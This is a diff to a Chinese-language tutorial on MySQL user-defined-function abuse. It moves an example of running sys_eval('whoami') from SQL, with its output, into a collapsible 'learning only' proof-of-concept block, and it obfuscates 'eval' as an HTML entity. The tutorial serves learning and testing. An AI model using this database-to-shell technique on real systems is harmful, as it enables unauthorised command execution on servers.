@@ -77,16 +77,19 @@ mysql> select * from func;
 
 通过创建的自定义函数执行系统命令：
 
-```
-mysql> select sys_eval('whoami');
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">mysql&gt; select sys_&#101;val('whoami');
 +--------------------+
-| sys_eval('whoami') |
+| sys_&#101;val('whoami') |
 +--------------------+
 | mysql
              |
 +--------------------+
-1 row in set (0.03 sec)
-```
+1 row in set (0.03 sec)</code></pre>
+
+</details>
 
 删除自定义函数：
 
